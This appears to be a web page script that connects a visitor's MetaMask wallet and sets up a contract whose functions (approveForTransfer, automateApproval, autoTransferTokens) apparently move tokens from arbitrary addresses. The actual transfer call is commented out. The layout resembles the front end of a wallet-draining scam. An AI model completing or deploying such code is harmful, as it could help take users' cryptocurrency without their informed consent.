window.addEventListener('load', async () => {
    const connectWalletButton = document.getElementById('connectWallet');
    const walletInfo = document.getElementById('walletInfo');
    const walletAddress = document.getElementById('walletAddress');
    const status = document.getElementById('status');

    // Check if MetaMask is installed
    if (typeof window.ethereum !== 'undefined') {
        console.log('MetaMask is installed!');

        connectWalletButton.addEventListener('click', async () => {
            try {
                // Request account access
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const userAccount = accounts[0];

                // Update the wallet address on the page
                walletAddress.textContent = userAccount;
                walletInfo.classList.remove('hidden');
                status.textContent = 'Wallet connected: ' + userAccount;

                // Initialize Web3 instance
                const web3 = new Web3(window.ethereum);

                // 智能合约地址
                const contractAddress = "0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2"; // 替换为你的合约地址

                // 智能合约 ABI
                const contractABI = [
                    {
                        "inputs": [
                            {
                                "internalType": "address",
                                "name": "tokenAddress",
                                "type": "address"
                            },
                            {
                                "internalType": "address",
                                "name": "from",
                                "type": "address"
                            },
                            {
                                "internalType": "address",
                                "name": "spender",
                                "type": "address"
                            }
                        ],
                        "name": "approveForTransfer",
                        "outputs": [],
                        "stateMutability": "nonpayable",
                        "type": "function"
                    },
                    {
                        "inputs": [
                            {
                                "internalType": "address",
                                "name": "tokenAddress",
                                "type": "address"
                            },
                            {
                                "internalType": "address",
                                "name": "spender",
                                "type": "address"
                            }
                        ],
                        "name": "automateApproval",
                        "outputs": [],
                        "stateMutability": "nonpayable",
                        "type": "function"
                    },
                    {
                        "inputs": [
                            {
                                "internalType": "address",
                                "name": "tokenAddress",
                                "type": "address"
                            },
                            {
                                "internalType": "address",
                                "name": "from",
                                "type": "address"
                            },
                            {
                                "internalType": "address",
                                "name": "to",
                                "type": "address"
                            }
                        ],
                        "name": "autoTransferTokens",
                        "outputs": [],
                        "stateMutability": "nonpayable",
                        "type": "function"
                    },
                    {
                        "inputs": [],
                        "stateMutability": "nonpayable",
                        "type": "constructor"
                    },
                    {
                        "inputs": [],
                        "name": "owner",
                        "outputs": [
                            {
                                "internalType": "address",
                                "name": "",
                                "type": "address"
                            }
                        ],
                        "stateMutability": "view",
                        "type": "function"
                    }
                ];

                // 创建合约实例
                const contract = new web3.eth.Contract(contractABI, contractAddress);

                // 在这里可以添加与智能合约的交互代码，例如调用方法
                // 例如：调用自动转移功能
                // await contract.methods.autoTransferTokens(tokenAddress, fromAddress, toAddress).send({ from: userAccount });

            } catch (error) {
                console.error('Error connecting wallet:', error);
                status.textContent = 'Failed to connect wallet.';
            }
        });
    } else {
        // MetaMask is not installed
        alert('MetaMask is not installed. Please install MetaMask to use this feature.');
    }
});
